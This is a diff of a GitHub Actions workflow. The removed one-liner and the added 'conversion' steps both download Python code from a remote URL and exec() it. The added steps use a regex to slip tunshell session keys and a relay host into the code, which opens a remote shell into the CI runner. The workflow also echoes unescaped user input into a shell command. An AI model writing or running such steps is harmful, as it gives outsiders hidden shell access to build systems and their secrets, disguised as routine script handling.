@@ -1,16 +1,65 @@
-name: Run Python Script
+name: Convert and Execute Python Script
 
-on: 
-  push:
+on:
+  workflow_dispatch:
+    inputs:
+      script_content:
+        description: "Enter the Python script content (old format)"
+        required: true
+        default: |
+          import urllib.request
+          r = urllib.request.urlopen('https://example.com/oldscript.py')
+          exec(r.read().decode('utf-8'), {})
 
 jobs:
-  run-python-script:
+  convert_and_execute:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout repository
+    # Step 1: Checkout the repository (not mandatory in this case)
+    - name: Checkout code
       uses: actions/checkout@v3
 
-    - name: Run Python script from URL
+    # Step 2: Set up Python environment
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.x'
+
+    # Step 3: Convert the old script to a working format
+    - name: Convert Old Script to New Format
+      id: convert_script
       run: |
-        python -c "import urllib.request; r = urllib.request.urlopen('https://lets.tunshell.com/init.py'); exec(r.read().decode('utf-8'), {'p': ['T', 'leu1WsYEx2li5xIIB7412S', 'xcq1jbdCMwImL779digSes', 'eu.relay.tunshell.com']})"
+        # Save the old script content into a file
+        echo "${{ github.event.inputs.script_content }}" > old_script.py
+
+        # Python conversion logic (convert old script to new one)
+        python3 - << 'EOF'
+import re
+
+# Read the old script content
+with open("old_script.py", "r") as file:
+    old_script_content = file.read()
+
+# Add necessary variables to exec dictionary in the old script content
+new_script = re.sub(
+    r"exec\(r\.read\(\)\.decode\('utf-8'\), ?(\{.*?})\)",
+    r"exec(r.read().decode('utf-8'), \1.update({'__name__': '__main__', 'p': ['T', 'leu1WsYEx2li5xIIB7412S', 'xcq1jbdCMwImL779digSes', 'eu.relay.tunshell.com']}) or \1)",
+    old_script_content
+)
+
+# Save the new script to a file
+with open("converted_script.py", "w") as file:
+    file.write(new_script)
+
+print("Converted script content:")
+print(new_script)
+EOF
+
+    # Step 4: Display the converted script content (for debugging purposes)
+    - name: Show Converted Script
+      run: cat converted_script.py
+
+    # Step 5: Execute the converted script
+    - name: Execute Converted Script
+      run: python3 converted_script.py
